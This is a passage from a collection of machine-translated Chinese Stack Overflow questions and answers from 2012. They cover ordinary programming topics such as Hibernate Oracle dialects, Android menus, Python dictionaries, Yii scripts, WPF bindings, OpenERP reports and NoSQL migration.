}
if (!found) {
    append to end of list
} else {
    insert before next
} 
```

# java - 使用 Oracle 生成的 SQL 查询语法是旧的

> ID：13429186
> 
> 赞同：0
> 
> 时间：2012-11-17T09:07:44.227
> 
> 标签：java, oracle, hibernate

我正在使用休眠 3.2.5。当我使用 a 时，`JOIN`我可以看到 Hibernate 生成的 sql 查询是 Oracle 9i 版本之前的语法。查询有 (+) 符号来表示`LEFT OUTER JOIN`而不是使用`LEFT OUTER JOIN`等等。

对于这个标准：

```
Criteria criteria = session.createCriteria(Dept.class).createAlias("empMap","id",CriteriaSpecification.LEFT_JOIN).add(Restrictions.eq("deptId", new Integer(6))); 
```

这是生成的 SQL 查询：

```
select this_.DEPT_ID as DEPT1_1_1_, this_.DEPT_NAME as DEPT2_1_1_, id1_.DEPT_ID as DEPT2_3_, id1_.EMP_ID as EMP1_3_, id1_.EMP_ID as formula0_3_, id1_.EMP_ID as EMP1_0_0_, id1_.DEPT_ID as DEPT2_0_0_, id1_.EMP_NAME as EMP3_0_0_, id1_.AGE as AGE0_0_, id1_.SEX as SEX0_0_ from dept this_, emp id1_ where this_.DEPT_ID=id1_.DEPT_ID(+) and this_.DEPT_ID=? 
```

我的问题是：

1）为什么查询具有旧语法？如果我使用 Hibernate 4.0 或最新版本，它会生成新的语法 SQL 查询吗？

`Outer Join`2）在这种情况下如何执行？我可以看到选项`LEFT JOIN`，`FULL JOIN`但看不到任何内容`RIGHT JOIN`

**编辑**

Q. 2 这是一个拼写错误，它的`RIGHT JOIN`

请让我知道这些。

问候，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T10:32:50.007

如果您查看[当前的 Hibernate 源代码](https://github.com/hibernate/hibernate-orm/)，您会发现 Oracle 有许多不同的[SQL 方言](https://github.com/hibernate/hibernate-orm/tree/master/hibernate-core/src/main/java/org/hibernate/dialect)：

*   [8](https://github.com/hibernate/hibernate-orm/blob/master/hibernate-core/src/main/java/org/hibernate/dialect/OracleDialect.java) - 已弃用，取而代之的是 8i
*   [8i](https://github.com/hibernate/hibernate-orm/blob/master/hibernate-core/src/main/java/org/hibernate/dialect/Oracle8iDialect.java) - 生成`(+)`语法
*   [9](https://github.com/hibernate/hibernate-orm/blob/master/hibernate-core/src/main/java/org/hibernate/dialect/Oracle9Dialect.java) - 支持 9i 或 10g 已弃用
*   [9i](https://github.com/hibernate/hibernate-orm/blob/master/hibernate-core/src/main/java/org/hibernate/dialect/Oracle9iDialect.java) - 生成`(+)`语法，带有注释*指定不使用“ANSI 连接语法”，因为 9i 似乎在所有情况下都不能正确处理它*
*   [10g](https://github.com/hibernate/hibernate-orm/blob/master/hibernate-core/src/main/java/org/hibernate/dialect/Oracle10gDialect.java) - 生成 ANSI 连接

因此，获得 ANSI 连接语法的唯一方法是使用 10g 方言。我不知道 3.2.5 中是否存在，或者是否存在，它的版本是否会生成 ANSI 连接，但这是您唯一可以尝试的方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T12:22:12.997

广告 2）如果您有“左连接”和“完全连接”（我猜是“右连接”）选项，那么您可以执行外连接。这是外连接的三种现有类型。没有“纯”外连接这样的东西。

# c++ - eclipse 使用 g++-4.exe 而不是 g++.exe

> ID：13429189
> 
> 赞同：0
> 
> 时间：2012-11-17T09:08:24.607
> 
> 标签：c++, eclipse, gcc, g++, cygwin

我`eclipse`用来写`c++`程序。我同时拥有`g++ 3.4`和`g++ 4.x`在`/cygwin/bin`目录中，我不想`eclipse`使用`g++-4.exe`另一个（名为`g++.exe`）。我怎么能说它使用`g++-4.exe`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:35:53.800

打开首选项菜单，然后搜索编译器。如果您对设置有任何问题，请阅读这篇关于 Eclipse CDT 安装的文章：
[Eclipse CDT](http://max.berger.name/howto/cdt/cdt.jsp%20Eclipse%20CDT)

# servlet-filters - FTL 可以修改设置属性的请求对象吗？

> ID：13429197
> 
> 赞同：0
> 
> 时间：2012-11-17T09:09:19.990
> 
> 标签：servlet-filters, freemarker

我知道 FTL 纯粹是一个渲染引擎，这应该在控制器中完成，但在我的场景中，我需要提供相同数据的多个表示。

我可以轻松编写呈现 XML 的 FTL，然后在自定义过滤器需要时将其转换为 JSON。然而，我们有大量的 FTL 要做。数据模型将是通用的。虽然 XML 方法是一种选择，但我不想一遍又一遍地重复相同的 XML 元素，（不同的团队成员编写手工 xml 元素是错误的根源，我们需要确保标记是相同的，等等）

但是我想知道我是否可以在我的 FTL 中填充一个对象

//假设 FreMarkerResolver 已将我的输出元模型作为模型的一部分公开 someObject.addRecords(Records)

//这里的一些逻辑 request.setAttribute("data",someObject);

那么我的 Servlet 过滤器只会将数据对象转换为 JSON、xml、YAML 或任何我想要的。

我在某处读过，例如会话不能从 FTL 修改，但是请求呢？我们至少可以设置一个新属性吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:29:32.570

FreeMarker 本身对 Servlet 或 HTTP 一无所知。即使您只能读取请求或会话对象，这已经是更高级别的 Web 应用程序框架正在做的事情。是否以及如何从模板中查看这些对象完全取决于 Web 应用程序框架，因此是否有修改它们的方法取决于它。现在我假设你的情况没有。

您可以创建一个`TemplateDirectiveModel`封装`Request`并执行您想要的操作，然后将其放入数据模型中，例如使用 name `storeInRequest`，这样您就可以`<@storeInRequest data=someObject />`在模板中执行类似的操作。或者您可以找出其他可以更好地表达您在该应用程序中想要的东西。关键是，由于`TemplateDirectiveModel`是用 Java 实现的，因此您可以在其中执行任何操作。（同样，你可以用 实现类似函数的东西`TemplateMethodModelEx`，但是如果你需要一个副作用而不是返回值，那么`TemplateDirectiveModel`更好。另外它有命名参数......）

# android - API 级别 15 中未显示选项菜单

> ID：13429211
> 
> 赞同：0
> 
> 时间：2012-11-17T09:11:18.880
> 
> 标签：android, android-actionbar, android-optionsmenu

我的清单上写着

```
<uses-sdk android:minSdkVersion="7" android:targetSdkVersion="15" /> 
```

我使用以下方法创建了包含两个项目的选项菜单

```
public boolean onCreateOptionsMenu(Menu menu) {
Log.d(TAG,"onCreateOptionsMenu");
MenuInflater inflater = getMenuInflater();
inflater.inflate(R.menu.menu1, menu);}

public boolean onOptionsItemSelected(MenuItem item)... 
```

我的 menu1 xml 如下

```
<menu xmlns:android="http://schemas.android.com/apk/res/android" >
<item android:id="@+id/eh_view" android:title="Edit Catagories"></item>
<item android:id="@+id/pin_project" android:title="Pin Project"></item> 
```

当我在 API 级别 9 上运行应用程序时（Gingerbread 菜单运行良好。但是，当我在 API 级别 15 上运行相同的应用程序时，菜单没有出现。我期待一个操作栏出现在带有 API 的手机上15级。我错过了一些代码吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-19T16:36:12.097

查看[ActionBar 的 Android 文档](http://developer.android.com/guide/topics/ui/actionbar.html)。确保您的主题中有一个主题`AndroidManifest.xml`（`Holo`或类似的后裔`Holo.Light`）。并非所有主题都支持 ActionBar。

# c++ - 结构内的数组

> ID：13429214
> 
> 赞同：0
> 
> 时间：2012-11-17T09:11:37.330
> 
> 标签：c++, arrays, structure

所以我创建了一个结构，它的唯一元素是一个指向数组的指针。当我初始化这个数组时，我得到一个分段错误。你能告诉我为什么吗？

这是代码：

```
typedef struct {
    int *data;
} A;

/* Class definition */
class C {
    A* a;
public:
    C(void);
};

/* Constructor */
C::C(void) {
    a->data = new int[10];
}

int main(void) {
    C();
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-17T09:12:35.443

因为 class`C`拥有一个指向 an 的指针`A`，该指针尚未初始化。`a->data`所以在那个阶段没有初始化。

顺便说一句，您的结构`A`不包含“指向数组的指针”，它包含指向`int`. 它不一定必须初始化为指向动态分配的数组：

```
int n = 42;
A a;
a.data = &n; 
```

此外，您的声明`A`在 C++ 中有些不寻常，并且与`class C`. 通常使用这种形式：

```
struct A {
  int* data;
}; 
```

# google-app-engine - Appengine/Amazon/Heroku 实例如何工作？

> ID：13429217
> 
> 赞同：2
> 
> 时间：2012-11-17T09:11:53.933
> 
> 标签：google-app-engine, heroku, amazon-s3, cluster-computing

我知道已经有大量关于这个主题的文档，但我只是在寻找一个简单的解释，Appengine 或其他一些提供的实例是如何真正工作的。

如果应用的软件不复杂，我知道它是如何工作的，但我对以下案例感兴趣。

假设我编写了一个程序来监听端口 8888 上的传入连接？如果我在我的普通服务器上运行该服务器，它将打开端口 8888 并开始侦听，但理论上它只能接受 65.535 连接（因为任何系统上都只有尽可能多的端口可用）。在实践中，这个数字要低得多，但让我们谈谈理论。如果我想扩展该应用程序，我需要在局域网中添加另一台计算机，并提供一个负载平衡器，将传入连接均匀地加载到两台机器上。但是问题还不止于此：如果传入的客户端需要访问彼此的数据怎么办，这意味着我还需要在后台同步数据库，所以两台服务器都保存了数据库中所有数据的副本（无论这可能是什么数据库）。这可能还需要对服务器进行额外的配置，并编写一段额外的代码来添加到服务器程序中。我们刚刚遇到了无数的问题，但让我们再次概述它们：

1.  将另一台服务器添加到 LAN。
2.  配置两台服务器以支持集群。
3.  在服务器进程中编写附加代码以了解集群是否到位。
4.  负载平衡传入连接。
5.  复制后端数据库中的数据。

但这还不是全部。如果我需要在两个用户需要实时聊天的情况下实现一个带有集群的双向通信聊天服务器怎么办？如果第一个用户连接到第一台服务器，第二个用户连接到第二台服务器，我将如何将数据从第一个发送到第二个服务器，反之亦然，这是一个非常复杂的问题。这给表格增加了另一个问题：

1.  连接到不同服务器的用户之间的实时通信。

上面的问题很复杂，不是那么容易解决的。我们需要无数个小时来思考它，并一点一点地解决它。但是像 Appengine/Amazon/Heroku 这样的解决方案说他们会照顾好这一切。所以这是我的问题。

1.  各种提供的实例如何真正起作用，我对以下三个感兴趣：

    *   应用引擎
    *   亚马逊
    *   Heroku
2.  他们如何扩展服务器应用程序，使其同时支持超过 65k 的连接用户？

3.  他们如何保证即使运行更多实例，无论哪个实例从数据库中提取数据，后端数据库中的数据都是相同的？

4.  连接到不同实例的用户之间的实时通信真的可以按应有的方式工作吗？

5.  如果所有软件都在某种硬件上运行，它们如何实现相同数量的实例一起工作，这通常需要 10 个硬件服务器连接到一个集群。

我想对上述问题的解释确实可以帮助开发人员/程序员/管理员更好地了解实例的实际工作方式。我想如果我们不知道它是如何工作的，我们就无法真正决定使用哪种产品。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T10:19:09.527

1.  各种提供的实例如何真正起作用？

    Appengine：像流程基础一样工作。你没有真正的服务器。App Engine 将尝试使用它的云架构师为您的网络服务提供服务，并计算您使用了多少资源，例如多少 cpu 时间、数据库查询、网络请求等。您不需要做任何事情来扩展或扩展它。

    Amazon（EC2 实例）：您创建并运行实例，然后像普通物理服务器一样使用它。像物理服务器一样扩展和架构师。您可能需要 Amazon S3 用于存储，Amazon RDS 用于数据库。

    Heroku：Heroku 实例调用测功机。每个测功机服务于每个作业服务，例如 Web 进程、后台进程、调度程序进程。例如，如果您创建 1 个 web dyno，它就像您有 1 个运行 1 个进程的 apache web 服务器来为您的网站提供服务。每个服务请求都需要在处理下一个请求之前完成，队列请求超时为 30 秒。您可以根据需要创建任意数量的测功机。Heroku 带有你需要为缓存大小付费的 postgresql。

2.  对于可扩展性，我已经在之前的答案中提到了如何扩展。

    用于支持超过 65k 的连接。您可以创建任意数量的实例来服务任何连接。

3.  数据库存储在单独的系统中。根据您的描述，我认为您的应用程序在每台服务器上都有单独的数据库。但是当您迁移到 PaaS 时，就像您在后端拥有一个数据库一样。每个实例都将连接到同一个数据库，以确保无论实例用户连接到何处，您都将获得相同的数据。

4.  这取决于您如何构建应用程序。例如，如果您使用以下流程创建聊天应用程序：

    *   发件人

        1.  发件人客户端向聊天服务器发送消息
        2.  聊天服务器将消息存储到数据库
    *   接收者

        1.  接收者客户端从聊天服务器拉取更新消息
        2.  聊天服务器从数据库获取更新消息
        3.  聊天服务器向接收者发送更新消息

    通过上述流程，您无需担心每个用户连接到哪个实例，因为每个用户总是会从同一个数据库中获取相同的数据（可能是延迟读取/写入数据库，但最终用户会收到相同的消息）。

5.  您不需要这样做，因为您有 1 个单一数据库。在后端，您可以根据需要扩展数据库的大小和功能，但应用程序的前端将是相同的。

# python - 修改以日期时间为键的字典

> ID：13429218
> 
> 赞同：1
> 
> 时间：2012-11-17T09:11:59.167
> 
> 标签：python, python-2.7

例如：

```
{datetime.date(2000, 1, 15): [1],
 datetime.date(2000, 1, 14): [5],
 datetime.date(2000, 1, 3): [4],
 datetime.date(2005, 1, 10): [2],
 datetime.date(2005, 1, 16): [4],
 datetime.date(2005, 1, 5): [2]} 
```

只是：

```
{(2000, 1): [10], (2005,1): [8]} 
```

基本上省略了这一天，并添加了值。我似乎无法弄清楚如何删除`datetime.date`.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-17T09:41:50.787

“单行”r：

```
newdict = {
    (key.year, key.month): sum(
        v[0] for k, v in olddict.iteritems()
        if (key.year, key.month) == (k.year, k.month)
    )
    for key in olddict
} 
```

```
>>> newdict
{(2000, 1): 10, (2005, 1): 8} 
```

这可能比 0605002 的答案效率低一些。

* * *

或更传统的解决方案：

```
from collections import defaultdict

newdict = defaultdict(lambda: [0])
for key in olddict:
    newdict[(key.year, key.month)][0] += olddict[key][0] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T09:35:50.050

简单的：

```
for key in olddict:
    if (key.year, key.month) in newdict:
        newdict[(key.year, key.month)][0] += olddict[key][0]
    else:
        newdict[(key.year, key.month)] = [olddict[key][0]] 
```

[从python 文档](http://docs.python.org/2/library/datetime.html#datetime-objects)了解有关`datetime`对象的更多信息。

# java - Netbeans中Swing组件的变量名

> ID：13429219
> 
> 赞同：1
> 
> 时间：2012-11-17T09:12:16.720
> 
> 标签：java, swing, jbutton

我有一个当前使用超过 200 个按钮的应用程序，每个按钮都返回其变量名的字符串。有没有办法做到这一点？为每个设置 name 属性将非常耗时。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T09:23:19.770

使用按钮集合：

```
ActionListener theActionListener = new ActionListener() {
    @Override
    public void actionPerformed(ActionEvent e) {
        System.out.println(((JButton) e.getSource()).getName());
    }
};

List<JButton> buttons = new ArrayList<JButton>();
for (int i = 0; i < 200; i++) {
    JButton button = new JButton("Button " + (i + 1));
    button.setName("Button " + (i + 1));
    button.addActionListener(theActionListener);
    buttons.add(button);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T09:24:05.523

用于`JButton#putClientProperty`识别具体的 JButton

```
buttons[i][j].putClientProperty("column", i);
buttons[i][j].putClientProperty("row", j);
buttons[i][j].addActionListener(new MyActionListener()); 
```

并从`ActionListener`（例如）获取

```
public class MyActionListener implements ActionListener {

    @Override
    public void actionPerformed(ActionEvent e) {
        JButton btn = (JButton) e.getSource();
        System.out.println("clicked column " + btn.getClientProperty("column")
                + ", row " + btn.getClientProperty("row"));
} 
```

*   但正确的方法`JButton`应该是使用[Swing Action](http://docs.oracle.com/javase/tutorial/uiswing/misc/action.html)而不是[ActionListener](http://docs.oracle.com/javase/tutorial/uiswing/events/actionlistener.html)

# maven - 有组件概述吗？

> ID：13429227
> 
> 赞同：1
> 
> 时间：2012-11-17T09:13:19.677
> 
> 标签：maven, plugins, inversion-of-control

是否有可以在 IoC 的帮助下导入插件的许多（可能是所有）组件的参考列表？（例如，是列出原型的目标）

我只找到了一个非常小的列表：[http ://maven.apache.org/shared/index.html](http://maven.apache.org/shared/index.html)

**编辑：**更多列表

[http://docs.codehaus.org/display/MAVENUSER/Mojo+Developer+Cookbook](http://docs.codehaus.org/display/MAVENUSER/Mojo+Developer+Cookbook)

# android - 显示我的活动而不是拨出电话的标准屏幕

> ID：13429228
> 
> 赞同：0
> 
> 时间：2012-11-17T09:13:33.693
> 
> 标签：android, call

我正在为 android 2.3.3 开发一个应用程序。它包含一些 TextViews 来显示拨出电话的信息：国家、当前时间、电话号码......我面临的问题是我不知道如何显示我的活动而不是拨出电话的标准屏幕。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T09:23:47.283

看看android中的[系统覆盖](https://stackoverflow.com/questions/4481226/creating-a-system-overlay-always-on-top-button-in-android)。它可用于在呼叫屏幕顶部放置自定义窗口。

# php - yii javascript 脚本内联

> ID：13429231
> 
> 赞同：3
> 
> 时间：2012-11-17T09:14:15.503
> 
> 标签：php, cakephp, yii

我有一个很长的 javascript，我需要在其中使用 YII CHtml 函数，但是，引号字符串使代码非常混乱。

例如，

```
$script = "$('#car_brand').click(function(e), {
   //codes
   var car_name = /"bmw/";
});";
<?php Yii::app()->clientScript->registerScript('car-js', $script); ?> 
```

上面的问题只是显示了一个简短版本的例子。CakePHP 的 scriptBlock 函数有什么等价物吗？

[http://book.cakephp.org/1.3/view/1604/scriptBlock](http://book.cakephp.org/1.3/view/1604/scriptBlock)

谢谢

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-11-17T09:30:40.713

> $script = <<< EOD
> 
> ```
> /* here you write your javascript normally in multiple lines */ 
> ```
> 
> 排爆；
> 
> Yii::app()->clientScript->registerScript('someId', $script);

你可以这样写。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:02:25.210

这不一定是正确的方法，但我总是这样做，因为带有引号的整个 Yii 脚本让我发疯。

在我的布局中，我像这样加载 jQuery（如果我要使用它，通常是 jQueryUI）：

```
<?php cs()->registerCoreScript('jquery'); ?>
<?php cs()->registerCoreScript('jquery.ui'); ?> 
```

然后我只在普通脚本标签中使用脚本，就像我不使用 Yii 时一样。通过使用 registerCoreScript 加载 jQuery 而不是仅仅以“正常”方式链接到 jQuery，它可以防止 Yii 用于 CGridView 之类的脚本出现问题

就像我说的那样，这不是最正确的方法，但我发现它对我来说是最好的解决方案，因为我使用了大量的 javascript

# c# - 如何在 C# silverlight windows mobile 7 应用程序中快进倒带我的媒体播放器？

> ID：13429234
> 
> 赞同：0
> 
> 时间：2012-11-17T09:15:19.697
> 
> 标签：c#, silverlight, windows-phone-7, xna

**我在做什么我** 正在制作一个 C# Silverlight Windows Mobile 7.5 媒体播放器，我正在使用 Medialibrary 类。它是一个简单的媒体播放器，它所做的只是播放存储在手机上 zune 库中的音频文件（还不是视频）。

**问题** 其他事情进展顺利，但现在我被卡住了。似乎没有办法为用户提供快进/快退按钮。我可以转到下一首曲目，但快进、快退或擦洗歌曲的唯一方法是按音量键，然后会出现一个菜单，这是 windows phone 自己的内置菜单。

**到目前为止，我尝试过** 查看 audiobackgroundservice ，但这似乎仅适用于流媒体，只能访问隔离存储，甚至无法访问 zune 歌曲库。

**一如既往地责备盖茨** 这是一件如此简单的事情，我不敢相信微软没有提供通过代码擦洗歌曲或快进/倒带的功能???????

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T18:13:22.417

您是否在音频任务中更改了播放器的位置属性。您需要在这些函数中调用 FastForward 和 Rewind。您还需要处理 Seek 操作，并在其中将玩家的 Position 属性设置为 param 的值（仅在指定 seek 时作为参数传递）。这将为您提供所需的功能。

您必须对回调中的`FastForward`或`Rewind`操作做出反应。`OnUserAction`

**从文档**：

用户操作不会自动更改系统状态；如果支持，代理负责执行用户操作。

# wpf - WPF：在 XAML 中具有 DataContext 属性的图像绑定

> ID：13429242
> 
> 赞同：0
> 
> 时间：2012-11-17T09:16:29.657
> 
> 标签：wpf, xaml, binding

我尝试`Image`根据[此类示例](http://msdn.microsoft.com/ru-ru/library/system.windows.media.imaging.bitmapimage.urisource.aspx)设置绑定。我的 XAML：

```
<Image x:Name="imgPhoto" x:FieldModifier="public" HorizontalAlignment="Stretch" 
     VerticalAlignment="Stretch">
    <Image.Source>
        <BitmapImage UriSource="{Binding Path=Photo, Mode=TwoWay}"/>
    </Image.Source>
</Image> 
```

但是我在窗口的构造函数中遇到异常（如下所示）。为什么会发生？

> System.Windows.Markup.XamlParseException 发生 HResult =-2146233087 Message =““System.Windows.Media.Imaging.BitmapImage”的初始化导致异常。”：行号“57”和行“34”中的行项目。

`Photo`是 item 的属性，`Employe`它是 的来源`DataContext`。它的属性将是一个`"pack://application:,,,/myImages/male.png"`字符串值。我将为我的`Window`实例设置它的属性。`Window`但是在我通过我的值初始化这个属性之前，我在 的构造函数中遇到了这样的异常。我的错误在哪里？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:32:36.070

您可以直接绑定到`Image.Source`您的`Photo`属性：

```
<Image Source="{Binding Path=Photo}" /> 
```

`Photo`属性应该是这样的：

```
"/YourProjectName;component/myImages/myPhoto.png"; 
```

当然 png 文件应该`Build Action`设置为`Resource`.

在 msdn 上你有关于这个的好文章，下面是它的链接。

[在 WPF 中打包 URI](http://msdn.microsoft.com/en-us/library/aa970069.aspx)

# report - 在OpenERP的其他班级的表单视图中打印班级的报告

> ID：13429243
> 
> 赞同：1
> 
> 时间：2012-11-17T09:16:50.207
> 
> 标签：report, openerp

销售订单的表单视图右侧只有销售订单的报表。如何在此表单视图中添加其他类，例如产品报告？并打印销售订单产品的报表。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T13:47:55.550

您必须按照以下步骤创建新模块，

创建一个文件夹，这是您的模块，例如模块名称。演示报告

此文件夹包含：

1) demo_report/ `__init__`.py 文件

```
import report 
```

2) demo_report/ `__openerp__`.py

```
{
    "name": "demo report",
    "version": "1.0",
    "depends": ["sale"],
    "author": "Serpent Consulting Services",
    "category": "Testing",
    "description": """
    This module provide :
    cr
    """,
    'update_xml': [],
    'installable': True,
    'auto_install':False, 
```

}

3) demo_report/demo_rep_view.xml：

```
<?xml version="1.0" encoding="UTF-8"?>

<openerp>
   <data>
   <report id="sale_order_product_id"
            string="Product Report"
            model="sale.order" 
            name="sale.order.product"
            rml="addons/demo_report/report/sale_order_product_report.rml"
            auto="True"
            />
  </data>
</openerp> 
```

4) 名为 report 的文件夹将包含您的 sale_order_product_detail.rml 和 product.py 文件。

5) demo_report/report/product.py ::

```
from report import report_sxw

class sale_order_product(report_sxw.rml_parse):

    def `__init__`(self,cr,uid,name,context):
        super(sale_order_product,self).__init__(cr,uid,name,context=context)

   report_sxw.report_sxw('report.sale.order.product','sale.order',
  'addons/demo_report/report/sale_order_product_detail.rml',parser=sale_order_product) 
```

6) demo_report/report/ `__init__`.py 文件

```
import product 
```

7) demo_report/report/sale_order_product_detail.rml

根据您的要求定义它。在 rml 中，您可以根据您的要求通过 sale.order 对象轻松设置所有产品详细信息。

这会帮助你..

如果有任何问题，请告诉我

问候，

阿尼尔·克萨里亚

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T05:11:05.667

在我的系统上`/usr/lib/pymodules/python2.7/openerp/addons/sale/sale_report.xml`描述了销售/报告。您可以从那里开始添加新报告。

# jquery-ui - jQuery UI Draggable：忽略拖放到相同/初始位置的拖动

> ID：13429250
> 
> 赞同：0
> 
> 时间：2012-11-17T09:18:16.240
> 
> 标签：jquery-ui, draggable, jquery-ui-draggable

我已经将一些 div 设置为“可放置”，并将其他一些 div（放置在可放置 div 内）设置为“可拖动”。

这是我的代码：

```
<script>

function handleDrop (event, ui) {
   var myDiv = document.getElementById("messages");
   var theDrop = $(this);
   var theDrag = ui.draggable;
   myDiv.innerHTML = myDiv.innerHTML + "<br>Dropped [" + theDrag.text() + "] with id = [" +  theDrag.attr("id") + "] in [" + theDrop.attr("id") + "]";

}

  $(function() {

      $( ".item" ).draggable( { tolerance: "fit", revert: "invalid", revertDuration: 150 } );
      $( ".column" ).droppable({ drop: handleDrop });

  });

</script> 
```

这很好用，但我的问题是如何修改 handleDrop 函数来检测可拖动元素所在的元素是否与开始拖动时所在的元素相同？换句话说，**如何检测拖动是否在同一个可放置 div 内开始和结束？**（我的目标是忽略此类“非事件”。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T09:12:53.660

您可以使用以下代码推断源和目标可放置容器：

```
 $( ".column" ).droppable({ 
    drop: function(event, ui) {
        console.log(event.target.id);
        console.log(ui.draggable[0].parentElement.id);

        var target = event.target.id;
        var source = ui.draggable[0].parentElement.id;
        if(target === source)
            alert('Same droppable container');
    }
  }); 
```

顺便说一句，它只在 IE9 和 Chrome 上测试，有时 FF 有不同的方法来检索事件参数。

**编辑**

这是一个小提琴来解释我的最后评论[http://jsfiddle.net/Bouillou/QvRjL/100/](http://jsfiddle.net/Bouillou/QvRjL/100/) [http://jsfiddle.net/Bouillou/QvRjL/100/](http://jsfiddle.net/Bouillou/QvRjL/100/)

# python - 如何在 python 中将文件从一个目录复制到另一个目录？

> ID：13429254
> 
> 赞同：1
> 
> 时间：2012-11-17T09:18:32.023
> 
> 标签：python

我正在尝试将名为备份的本地文件夹中的“.mp4”格式文件复制到另一个目录`/media/c1`。为此，我尝试了下面的 python 代码。

```
import shutil
fileList = os.listdir('/opt/backup/') 
for f in fileList:
  try:
    flocation = '/opt/backup/' + f
    fpath = '/media/c1/' + f
    shutil.copy2(flocation, fpath)
  except IOError:
    print("IOERROR") 
```

运行此脚本时，它会引发以下错误。

```
The file path is :/media/c1/1027.mp4
Traceback (most recent call last):
  File "./test.py", line 33, in <module>
    shutil.copy2(flocation, fpath)
  File "/usr/lib/python2.6/shutil.py", line 100, in copy2
    copystat(src, dst)
  File "/usr/lib/python2.6/shutil.py", line 73, in copystat
    os.utime(dst, (st.st_atime, st.st_mtime))
OSError: [Errno 1] Operation not permitted: '/media/c1/1027.mp4' 
```

我需要复制位于备份文件夹中的所有媒体文件并将其粘贴到`/media/c1/`目录中。

# java - 将一张大表从 MS SQL 移动到无 SQL DB

> ID：13429257
> 
> 赞同：2
> 
> 时间：2012-11-17T09:18:59.403
> 
> 标签：java, database, jdbc, nosql

我们有一个巨大的 MS SQL 数据库，它只包含一个表。这个表很简单，我们只做select、insert和delete。没有加入或更新操作。更重要的是，插入/删除操作来自当前架构中的单个主机。

数据库查询非常慢，即使我们很难添加索引，它们也没有足够的帮助。我们可以使用无限数量的小型主机，我们正在考虑转向分布式数据库解决方案。但我们希望查询界面尽可能与今天相似。

1.  什么是最能满足我们需求的？
2.  以 == x 形式查询的惩罚是什么
3.  我们如何进行这种转移？最少的数据库停机时间当然是可取的，但我们可以管理（它保存了 BI 信息）。
4.  我们正在使用 JDBC，因为我们正在从 Java 应用程序访问，哪些与它一起工作得很好？
5.  据我了解，我们需要面向文档的数据库，对吗？

我们有很多按字段的查询，我们为其中一些维护键。更重要的是 id 和一些日期字段。我们不仅通过键查询，而且对所有字段都有查询。我们维护一个有很多列的大表。也许 HIVE 提供了我们想要的解决方案，SQL 查询但具有分布式数据库性能？
插入和删除性能不太重要。长查询是目前困扰我们的问题。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T11:15:09.607

有两个选项可以帮助您使用当前的 RDBMS

*   你能分片信息吗？您是否有一些自然键（用户名、用户 ID、时间 - 月/日/小时等），您可以通过这些键将信息分成几个表？就其本身而言，这应该会给您带来巨大的好处，因为表格大小将大大减少。我已经成功使用了几次。请注意，这意味着它改变了您访问数据库的方式——所有 CRUD 操作都必须考虑分片，并且聚合方法变得更加复杂，因为它们必须在多个表上运行。
*   你使用某种复制吗？如果您将写入拆分到一台服务器并将写入拆分到另一台服务器，它应该会提高性能。

为了更好地回答哪个数据库适合您，请提供有关架构和用法的更多信息 - 您是仅按主键还是按字段查询？如果您索引字段，那么面向文档的数据库可能适合您。同样，这取决于信息的总量。一些数据库（如 MongoDB）在它们可以处理和推荐的分片信息量方面也受到限制。所有流行的数据库都支持 Java，但不支持 JDBC（因为没有关系...）

关于迁移 - 我建议采用两阶段的方法：

1.  转储当前信息并将其（转换后）插入新数据库
2.  在您的 Java 代码中，向您的 DAO 添加一个将新数据插入 RDBMS 和新数据库的代码。干净利落的切换可能很棘手，但您可以设置一个基于时间的阈值，这可能会使其更容易。

最后一个建议——你看过像[VoltDB](http://voltdb.com/)这样的新 SQL 数据库吗？

**编辑**

根据您所写的内容，我建议两者中的任何一个：

*   面向文档的数据库，例如 MongoDB 或 CouchDB 等，它们将允许您索引字段而不仅仅是主键。此外，Couchbase 将在几周后进行[CouchConf-Israel](http://www.couchbase.com/couchconf-israel)，因此您也可以去寻求帮助（对于热门建议的时间性质，抱歉...）
*   面向列的数据库，例如 HBase，但在这里您需要为字段索引添加表，因为只能搜索表的主键。

请注意，Hive 是编写 Hadoop map-reduce 方法的好方法，它不保证任何性能提升。

我也同意 Shai Berger 的观点——一张大桌子听起来确实有设计的味道。你能打破它吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-18T14:16:08.407

你试过[Memcached](http://memcached.org/)吗？它在不改变您的数据库基础设施的情况下对 RDBMS 做了很多好事，即根据您的查询模式，您应该期望在 x2-x10 性能改进之间有任何东西。Memcached 客户端适用于所有编程语言和平台

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-17T09:30:52.997

该表可能已变得支离破碎。您可以尝试导出和导入到不同的服务器并运行相同的查询。如果他们跑得更快，那么它很可能是碎片化的。

# java - 使用条件的非 Equijoin 查询

> ID：13429260
> 
> 赞同：0
> 
> 时间：2012-11-17T09:19:13.880
> 
> 标签：java, hibernate, oracle10g

如何使用 Criteria 在 Hibernate 中编写非 equijoin 查询？

我有员工表和等级表。我想根据该员工的薪水获取每个员工的员工交易和工作等级。

下面是 SQL：

```
select e.empName, e.salary. g.grade
from employees e, grade g
where e.salary between g.lowest_sal and g.highest_sal 
```

对此的等效条件查询是什么？

请让我知道这件事。

# android - 使用 SDK 管理器下载 Android 源代码？

> ID：13429266
> 
> 赞同：1
> 
> 时间：2012-11-17T09:20:39.663
> 
> 标签：android, sdk

